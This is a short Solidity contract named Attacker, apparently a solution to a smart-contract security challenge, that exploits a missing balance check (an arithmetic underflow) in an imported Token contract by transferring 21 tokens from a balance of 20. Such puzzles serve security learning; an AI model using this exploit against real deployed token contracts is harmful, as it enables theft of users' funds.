// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract Attacker{

    Token token;

    constructor(Token _token)public {
        token = _token;
    }

// As you get a balance of 20 tokens, 
// you can send 21 as you do not have any requirement to do not send more tokens than your balance.
    function attack() public returns(bool success){
        token.transfer(msg.sender, 21);
        return success;
    } 
}
